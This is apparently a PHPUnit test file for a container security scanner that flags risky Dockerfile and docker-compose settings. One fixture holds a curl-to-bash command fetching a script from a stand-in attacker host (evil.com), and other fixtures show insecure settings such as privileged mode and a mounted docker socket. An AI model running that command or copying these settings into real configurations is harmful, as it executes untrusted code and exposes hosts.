<?php

namespace Tests\Unit;

use App\Services\Scan\Scanners\ContainerScanner;
use PHPUnit\Framework\TestCase;

class ContainerScannerTest extends TestCase
{
    protected ContainerScanner $scanner;

    protected function setUp(): void
    {
        parent::setUp();
        $this->scanner = new ContainerScanner();
    }

    public function test_it_ignores_non_container_files()
    {
        $findings = $this->scanner->scan('FROM ubuntu:latest', ['FROM ubuntu:latest'], 'app/Models/User.php', 'http://repo');
        $this->assertEmpty($findings);
    }

    public function test_it_detects_latest_tag_in_dockerfile()
    {
        $content = "FROM ubuntu:latest\nUSER root\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $this->assertNotEmpty($findings);
        
        $latestFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-LATEST');
        $this->assertNotNull($latestFinding);
        $this->assertEquals('FROM ubuntu:latest', $latestFinding->evidence);
        $this->assertEquals('medium', $latestFinding->severity);
    }

    public function test_it_detects_implicit_latest_tag_in_dockerfile()
    {
        $content = "FROM ubuntu\nUSER root\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $latestFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-LATEST');
        $this->assertNotNull($latestFinding);
    }

    public function test_it_ignores_pinned_digest()
    {
        $content = "FROM ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2\nUSER app\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $latestFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-LATEST');
        $this->assertNull($latestFinding);
    }

    public function test_it_detects_user_root()
    {
        $content = "FROM ubuntu:20.04\nUSER root\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $rootFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-ROOT');
        $this->assertNotNull($rootFinding);
        $this->assertEquals('USER root', $rootFinding->evidence);
        $this->assertEquals('high', $rootFinding->severity);
    }

    public function test_it_ignores_non_root_user()
    {
        $content = "FROM ubuntu:20.04\nUSER appuser\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $rootFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-ROOT');
        $this->assertNull($rootFinding);
    }

    public function test_it_detects_curl_bash()
    {
        $content = "FROM ubuntu:20.04\nRUN curl -sSL https://evil.com/script.sh | bash\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $curlFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-CURL-BASH');
        $this->assertNotNull($curlFinding);
        $this->assertEquals('critical', $curlFinding->severity);
    }

    public function test_it_detects_risky_add()
    {
        $content = "FROM ubuntu:20.04\nADD https://example.com/file.tar.gz /tmp/\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $addFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-ADD');
        $this->assertNotNull($addFinding);
        $this->assertEquals('low', $addFinding->severity);
    }

    public function test_it_ignores_safe_copy()
    {
        $content = "FROM ubuntu:20.04\nCOPY package.json /app/\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'Dockerfile', 'http://repo');
        
        $addFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DF-ADD');
        $this->assertNull($addFinding);
    }

    public function test_it_detects_compose_privileged()
    {
        $content = "services:\n  web:\n    image: nginx\n    privileged: true\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'docker-compose.yml', 'http://repo');
        
        $privFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DC-PRIVILEGED');
        $this->assertNotNull($privFinding);
        $this->assertEquals('critical', $privFinding->severity);
    }

    public function test_it_detects_compose_docker_sock()
    {
        $content = "services:\n  web:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'docker-compose.yaml', 'http://repo');
        
        $sockFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DC-SOCK');
        $this->assertNotNull($sockFinding);
        $this->assertEquals('critical', $sockFinding->severity);
    }

    public function test_it_detects_compose_host_network()
    {
        $content = "services:\n  web:\n    network_mode: \"host\"\n";
        $findings = $this->scanner->scan($content, explode("\n", $content), 'compose.yml', 'http://repo');
        
        $netFinding = collect($findings)->firstWhere('scannerRuleId', 'SEC-CONTAINER-DC-HOST-NET');
        $this->assertNotNull($netFinding);
        $this->assertEquals('high', $netFinding->severity);
    }
}
